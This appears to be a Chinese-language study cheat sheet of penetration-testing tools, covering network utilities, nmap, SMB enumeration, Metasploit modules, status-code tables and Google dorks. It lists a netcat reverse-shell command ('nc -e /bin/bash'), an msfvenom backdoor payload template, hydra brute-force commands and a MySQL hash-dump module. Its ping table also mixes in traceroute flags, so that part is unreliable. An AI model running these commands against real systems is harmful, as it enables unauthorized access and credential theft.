# 🔧 Tools

## Linux 系統內建

### `ping`
>測試目標是否存活（ICMP封包）

>Linux內建指令

`ping IP address or website URL`


<details>
<summary>參數說明</summary>

`ping -c 10 MACHINE_IP`

| 參數                            | 解釋                  |
|:------------------------------|:--------------------|
| `-c` (Linux) / `-n` (Windows) | 自訂封包數量              |
| `-s` (Linux) / `-l` (Windows) | 自訂封包大小（以 bytes 為單位） |
| `-m <max_ttl>` | 設定最大跳數（預設 30）              |
| `-q <n>`       | 每跳送幾個封包（預設 3）              |
| `-w <sec>`     | 每次等多久再 timeout（預設 5 秒）     |
| `-I`           | 改用 ICMP echo（像 ping）而非 UDP |
| `-T`           | 改用 TCP SYN（有時可以繞過封包過濾）     |


</details>


---

### `traceroute`

>網路診斷工具，追蹤資料封包從你電腦到目標主機所經過的路由節點（預設情況下走 UDP）

>Linux內建指令

`traceroute IP address or website URL` <br>（Linux、Mac）

`tracert IP address or website URL` <br>（MS Windows）

---

### `nc`
>_netcat_：建立 TCP/UDP 連線、傳輸資料、反向 shell

>Linux內建指令 

`nc -lvnp <port> (listen)`<br>
`nc <IP> <port> (connect)`

<details>
<summary>參數說明</summary>

`nc -lvnp 4444`

| 參數        | 解釋                              |
|:----------|:--------------------------------|
| `-l`      | listen 模式                       |
| `-v`      | verbose（回報狀態）                   |
| `-vv`     | very verbose（詳細回報狀態）            |
| `-n`      | 不做 DNS 查詢                       |
| `-p 4444` | 指定監聽 port（可自選）                  |
| `-w`      | 設定 timeout（單位是秒）                |
| `-z`      | 只掃 port，不傳資料（通常配合 -v 看開啟的 port） |
| `-e`      | 執行程式                            |
| `-k`      | 用戶端斷開連接後繼續偵聽                         |

- 小於 1024 的 port 需要 root 許可權才能偵聽

</details>


<details>
<summary>常見用法範例</summary>


| 用法                        | 說明                    |
|---------------------------| --------------------- |
| `nc IP port`              | 抓 Banner，像 telnet     |
| `nc -lvnp PORT`           | 開啟監聽器                 |
| `nc -vn IP PORT`          | 快速 TCP 探測（有無通訊）       |
| `nc -w 1 -zv IP 20-100`   | TCP 掃 port（加 `-z` 模式） |
| `nc -e /bin/bash IP PORT` | 反彈 Shell（需具備 `-e` 版本） |
| `nc -l > file.txt`        | 等待接收檔案（Server）        |
| `nc IP PORT < file.txt`   | 傳送檔案給對方（Client）       |



</details>

---

### `telnet`
>建立 TCP 連線的工具

>Linux內建指令  

`telnet [ip] [port]`

---

### `FTP`
>建立 FTP 連線的工具

>Linux內建指令 

`ftp [ip] [port]`


---

### `SSH`
>建立 SSH 連線的工具

>Linux內建指令

`ssh <ID>@<目標IP>`

<details>
<summary>參數說明</summary>

| 指令範例                            | 說明                       |
|-------------------------------------|----------------------------|
| `ssh 使用者名稱@目標IP`              | 連線到遠端主機             |
| `ssh -p 連接埠 使用者名稱@目標IP`    | 指定連接埠（預設是 22）    |
| `ssh -i 私鑰檔案 使用者名稱@目標IP` | 使用指定私鑰登入           |
| `ssh 使用者名稱@目標IP '指令'`        | 遠端直接執行一條指令後登出 |

</details>

---
### `mkdir`
>建立新資料夾

>Linux內建指令

---
### `mount`
>掛載 NFS 的主要工具

>Linux內建指令

`mount -t nfs 10.10.20.187:home /tmp/mount/ -nolock`

<details>
<summary>參數說明</summary>

| 部分                    | 說明                                               |
|-------------------------|----------------------------------------------------|
| `mount`                | 執行掛載指令                                       |
| `-t nfs`               | 指定掛載的類型為 NFS（Network File System）        |
| `10.10.20.187:home`    | 遠端 NFS 伺服器 IP 與分享目錄名稱                  |
| `/tmp/mount/`          | 本地掛載點，NFS 分享內容將顯示在這個資料夾內       |
| `-nolock`              | 停用鎖定功能，避免因為鎖定機制出錯掛載失敗         |

</details>

---
### `cp`
>複製檔案

>Linux內建指令

<details>
<summary>參數說明</summary>

| 指令     | 說明                         |
|----------|------------------------------|
| `cp 檔案1 檔案2` | 複製檔案1，並建立檔案2 |
| `cp 檔案 資料夾/` | 複製檔案到指定資料夾   |
| `cp -r 資料夾1 資料夾2` | 複製整個資料夾（遞迴複製） |
| `cp -v 檔案1 檔案2` | 顯示複製過程（verbose 模式） |

</details>

---
### `chmod`
> 改變檔案或資料夾的「權限」

`chmod 755 檔案`
`chmod +x 檔案`

<details>
<summary>參數說明</summary>

| 數字 | 對應權限 | 說明     |
|------|----------|----------|
| 7    | rwx      | 讀寫執行 |
| 6    | rw-      | 讀寫     |
| 5    | r-x      | 讀 + 執行 |
| 4    | r--      | 只有讀   |
| 0    | ---      | 無權限   |

| 符號 | 對象     | 說明             |
|------|----------|------------------|
| u    | user     | 擁有者           |
| g    | group    | 群組             |
| o    | other    | 其他人           |
| a    | all      | 所有人（u+g+o）  |

| 符號 | 動作       | 說明               |
|------|------------|--------------------|
| +    | 增加權限   | 增加指定對象的權限 |
| -    | 移除權限   | 移除指定對象的權限 |
| =    | 設定權限   | 設定為指定的權限（取代原本設定） |

| 權限符號 | 數值 | 英文含義  |
|-----------|------|------------|
| r         | 4    | read       |
| w         | 2    | write      |
| x         | 1    | execute    |

- chmod +s 同時為檔案加上 Setuid + Setgid
    - 可用 ls -l 查看，如：
      - `-rwsr-xr-x` 表示有 Setuid
      - `-rwxr-sr-x` 表示有 Setgid

</details>

---
### `chown`

`chown [新擁有者] 檔案或資料夾`<br>
`chown [新擁有者]:[新群組] 檔案或資料夾`

<details>
<summary>參數說明</summary>

| 指令                            | 說明                             |
|----------------------------------|----------------------------------|
| `chown root file.txt`           | 將擁有者改為 root                |
| `chown root:root file.txt`      | 改為 root 擁有、root 群組        |
| `chown -R user:group myfolder`  | 遞迴更改整個資料夾的擁有權       |


</details>

---

### `nslookup`

> 查詢 DNS 記錄的命令列工具。
它可以幫你查出一個網域名稱對應的 IP 位址、DNS 記錄、名稱伺服器（NS） 等資訊。

`nslookup [選項] [網域名稱]`

<details>
<summary>參數說明</summary>

| 參數                   | 用途                      | 範例                                 |
| -------------------- | ----------------------- | ---------------------------------- |
| `-type=` 或 `-query=` | 指定查詢類型（如 A, MX, TXT）    | `nslookup -type=mx gmail.com`      |
| `-debug`             | 顯示更詳細的 DNS 封包資料（進階分析）   | `nslookup -debug example.com`      |
| `-port=`             | 改用自定義 DNS 連接埠（預設是 53）   | `nslookup -port=5353 example.com`  |
| `-timeout=`          | 設定等待時間（秒）               | `nslookup -timeout=10 example.com` |
| `-retry=`            | 重試次數（預設是 4）             | `nslookup -retry=1 example.com`    |
| `-class=`            | DNS 類別，通常用不到（預設是 IN）    | `nslookup -class=IN example.com`   |
| `-vc`                | 使用 TCP 查詢（預設是 UDP）      | `nslookup -vc example.com`         |
| `-norecurse`         | 不讓 DNS 伺服器遞迴查詢（測試權威伺服器） | `nslookup -norecurse example.com`  |

</details>

<details>
<summary>常見用法範例</summary>


| 查詢內容        | 指令範例                             | 說明                           |
|-----------------|----------------------------------|--------------------------------|
| A 紀錄（IPv4）  | `nslookup tryhackme.com`         | 查詢對應的 IPv4 位址          |
| 指定 DNS 伺服器 | `nslookup tryhackme.com 8.8.8.8` | 使用 Google DNS 查詢          |
| MX 記錄         | `nslookup -type=mx gmail.com`    | 查詢處理郵件的伺服器地址       |
| NS 記錄         | `nslookup -type=ns google.com`   | 查詢該網域的名稱伺服器         |
| TXT 記錄        | `nslookup -type=txt example.com` | 查詢 SPF、驗證碼等文字記錄     |
| 反查 IP         | `nslookup 8.8.8.8`               | 查詢該 IP 對應的主機名稱       |


</details>

---

### `sha256sum`

> 產生 SHA-256 雜湊值（hash）， 可以拿來驗證檔案完整性、比對惡意樣本、與情資平台交叉分析。


## 套件

### `nmap`
>掃描主機、開放的 port 和服務資訊

<details>
<summary>參數說明</summary>

| 指令 | 功能說明 |
|:----|:----|
| `nmap -sn <IP>` | 只探測主機是否存活（Ping 掃描，不掃 port） |
| `nmap <IP>` | 快速掃描目標主機，**預設掃描前 1000 個常見 port** |
| `nmap -p- <IP>` | 掃描 **所有 0-65535 個 port**（慢但全面） |
| `nmap -sV <IP> -p <Port>` | 掃描指定的 port，並嘗試探測服務版本 |
| `nmap -sC <目標IP或網址>` | 使用 Nmap 的預設腳本 (default scripts) 來掃描目標，快速檢查常見弱點 |
| `nmap -A -p <Port> -T4 <IP>` | 掃描指定 port，且啟用 **Aggressive mode**（OS 偵測、版本偵測、traceroute、script 掃描），T4 表示速度加快 |

</details>

---

### `enum4linux`
>枚舉（列舉）Windows SMB 資訊

`enum4linux -a <IP>`

<details>
<summary>參數說明</summary>

| 參數 | 功能說明 |
|:----|:----|
| `-U` | 獲取使用者清單（User list） |
| `-M` | 獲取機器名稱清單（Machine list） |
| `-N` | 傾印名稱清單（Name list dump，與 `-U`、`-M` 不同） |
| `-S` | 獲取共享資源清單（Share list） |
| `-P` | 顯示密碼政策資訊（Password policy） |
| `-G` | 顯示群組與成員清單（Group + Members） |
| `-a` | 執行以上所有功能（全自動基本列舉） |

</details>

---

### `smbclient`
>連接 SMB 共享目錄、列目錄、上傳/下載檔案

`smbclient //[IP]/[SHARE] -User -Port`

<details>
<summary>參數說明</summary>

| 參數       | 說明                                       |
|------------|--------------------------------------------|
| `-U` 使用者名稱 | 指定用哪個帳號連線（例如：`-U Moieph`）         |
| `-p` 埠號       | 指定使用的埠號（預設為 `445`）                   |

</details>

---

### `tcpdump`
>抓取網路封包（分析流量）

`sudo tcpdump -i <interface>`

<details>
<summary>參數說明</summary>

| 指令 | 說明 |
|:----|:----|
| `sudo tcpdump -i eth0` | 抓取 eth0 網卡的所有封包 |
| `sudo tcpdump -i lo port 80` | 只抓本地連接的 HTTP 封包 |
| `sudo tcpdump -i wlan0 host 192.168.1.1` | 只抓特定 IP 的封包 |
| `sudo tcpdump -i eth0 -nn -vvv` | 不反解主機名稱或服務，詳細輸出 |
| `sudo tcpdump -i eth0 -w output.pcap` | 把結果存成 `.pcap` 檔，可用 Wireshark 分析 |

</details>

---

### `msfvenom`
>產生各種 payload（後門程式、shellcode）

`msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format>`

---

### `hydra`
>密碼爆破工具

爆破 FTP 密碼（單帳號）範例：<br>
`hydra -l dale -P /usr/share/wordlists/rockyou.txt -vV ftp://10.10.10.6`

爆破 SSH（多帳號）範例：<br>
`hydra -L users.txt -P passwords.txt -vV ssh://10.10.10.6`

<details>
<summary>參數說明</summary>

| 參數 | 說明 |
|:----|:----|
| `-l <帳號>` | 指定一個帳號（單一帳號測試） |
| `-L <檔案>` | 指定帳號清單檔案（多個帳號爆破） |
| `-p <密碼>` | 指定一個密碼（單一密碼測試） |
| `-P <檔案>` | 指定密碼清單檔案（多個密碼爆破） |
| `-C <檔案>` | 指定帳號:密碼格式的清單檔案（login:pass 格式） |
| `-t 4` | 每個目標開幾個連線並行（預設 16，可調整） |
| `-s <port>` | 指定非預設 port（例如 FTP 改其他 port） |
| `-e nsr` | 嘗試 null 密碼 (n)、帳號=密碼 (s)、反轉 (r) |
| `-vV` | 超詳細輸出，每一組帳密都顯示 |
| `-f` | 找到就停止（單一目標） |
| `-F` | 找到就停止（多目標） |
| `-o <檔案>` | 將成功結果寫入檔案 |

</details>

---
### `showmount`
>查詢 NFS 伺服器有哪些「共享的資料夾（exports）」

`/usr/sbin/showmount -e <IP>`

<details>
<summary>參數說明</summary>

| 部分                    | 意思                            |
|-----------------------|---------------------------------|
| `/usr/sbin/showmount` | 使用 showmount 指令，查詢 NFS 分享 |
| `-e`                  | exported，列出伺服器開放的共享目錄 |
| `IP`                  | 目標 NFS 伺服器的 IP 位址         |

</details>

---

### `john`
> 密碼破解工具，主要針對「加密後的密碼雜湊值（hash）」進行暴力破解或字典破解。

`john hash.txt`<br>
會自動嘗試使用內建的字典與規則破解 hash.txt 裡的雜湊。

---

## msfconsole

---

### `msfconsole` 
> 啟動 Metasploit 主控台

---

### `smtp_version`
> 版本檢測模組

> `msfconsole`模組
---

### `smtp_enum`
> 進行 SMTP 使用者枚舉

> `msfconsole`模組
---

### `mysql_sql`
> 用來對 MySQL 執行 SQL 指令，例如：查詢版本、測試連線等

> `msfconsole`模組 
---

### `mysql_schemadump`
> MySQL 架構（Schema）枚舉模組，自動列出遠端 MySQL 資料庫結構內容。

> `msfconsole`模組 
---

### `mysql_hashdump`
> 從 MySQL 資料庫中導出使用者帳號與密碼的雜湊值（hash）

> `msfconsole`模組 

---

## 系統規範

### `HTTP_Status_Codes`

<details>
<summary>狀態碼說明</summary>

| 範圍 | 類別說明        | 常見碼 | 說明                                   |
|------|------------------|--------|----------------------------------------|
| 1xx  | 🌀 資訊回應       | 100    | Continue：繼續請求                     |
| 2xx  | ✅ 成功處理       | 200    | OK：成功                                |
|      |                  | 201    | Created：成功建立（如帳號）             |
| 3xx  | 🌫️ 重定向        | 301    | Moved Permanently：永久搬家             |
|      |                  | 302    | Found：臨時搬家                         |
| 4xx  | ❌ 用戶端錯誤     | 400    | Bad Request：請求格式錯                 |
|      |                  | 401    | Unauthorized：需要登入認證             |
|      |                  | 403    | Forbidden：禁止訪問（即使有登入）       |
|      |                  | 404    | Not Found：找不到資源                   |
|      |                  | 405    | Method Not Allowed：方法錯誤（ex. 用 GET 打 POST） |
| 5xx  | 💥 伺服器錯誤     | 500    | Internal Server Error：伺服器爆炸       |
|      |                  | 503    | Service Unavailable：維護中或爆掉       |

🧠 小技巧記憶法：
- 2xx = 成功
- 3xx = 轉址
- 4xx = 你錯了
- 5xx = 伺服器錯了

</details>

---

### `SMTP_Response_Codes`

<details>
<summary>狀態碼說明</summary>

| 回應碼 | 含義 |
|--------|------|
| 500    | 格式錯誤，命令不可識別（此錯誤也包括命令行過長） |
| 501    | 參數格式錯誤 |
| 502    | 命令不可實現 |
| 503    | 錯誤的命令序列 |
| 504    | 命令參數不可實現 |
| 211    | 系統狀態或系統幫助訊息 |
| 214    | 幫助信息 |
| 220    | 服務就緒 |
| 221    | 服務關閉傳輸通道 |
| 421    | 服務未就緒，關閉傳輸通道（當必須關閉時，此回應可以作為對任何命令的回應） |
| 250    | 要求的郵件操作完成 |
| 251    | 用戶非本地，將轉發向 |
| 450    | 要求的郵件操作未完成，郵箱不可用（例如，郵箱忙） |
| 550    | 要求的郵件操作未完成，郵箱不可用（例如，郵箱未找到，或不可訪問） |
| 451    | 放棄要求的操作，處理過程中出錯 |
| 551    | 用戶非本地，請重試 |
| 452    | 系統存儲不足，要求的操作未執行 |
| 552    | 過量的存儲分配，要求的操作未執行 |
| 553    | 郵箱名不可用，要求的操作未執行（例如郵箱格式錯誤） |
| 354    | 開始郵件輸入，以結束 |
| 554    | 操作失敗 |
| 535    | 用戶驗證失敗 |
| 235    | 用戶驗證成功 |
| 334    | 等待用戶輸入驗證信息 |

</details>

---

### `Core_Windows_Processes`

<details>
<summary>狀態碼說明</summary>

| 程序層級結構（Parent > Child）         | 說明                                           |
|----------------------------------------|------------------------------------------------|
| System                                 | 最底層核心程序，其父程序為 System Idle (PID 0) |
| System > smss.exe                      | Session 管理器                                 |
| csrss.exe                              | Client/Server Runtime 子系統                   |
| wininit.exe                            | Windows 初始化                                 |
| wininit.exe > services.exe             | 系統服務管理器                                 |
| services.exe > svchost.exe             | 多數服務會由 svchost.exe 執行                  |
| lsass.exe                              | 本地安全授權子系統                             |
| winlogon.exe                           | 登入管理程序                                   |
| explorer.exe                           | 使用者桌面與檔案總管界面                       |

📌 除了 System 以外，**若有程序「無父程序」或異常繼承鏈，需特別留意。**

</details>

## Miscellaneous

### `Google_Dork`

<details>
<summary>關鍵字說明</summary>

| 語法          | 用法說明               | 範例                       |
| ----------- | ------------------ | ------------------------ |
| `site:`     | 限定在某個網站內搜尋         | `site:gov.tw`            |
| `intitle:`  | 頁面標題含有指定關鍵字        | `intitle:"index of"`     |
| `inurl:`    | URL 中包含某段文字        | `inurl:admin`            |
| `filetype:` | 搜尋特定副檔名的文件（如 PDF）  | `filetype:xls password`  |
| `ext:`      | 跟 `filetype:` 相同作用 | `ext:doc confidential`   |
| `cache:`    | 查看網頁快取（即使原頁面下架）    | `cache:example.com`      |
| `link:`     | 搜尋有指向某網址的連結頁面      | `link:example.com`       |
| `intext:`   | 內文中包含某些字詞          | `intext:"internal only"` |

</details>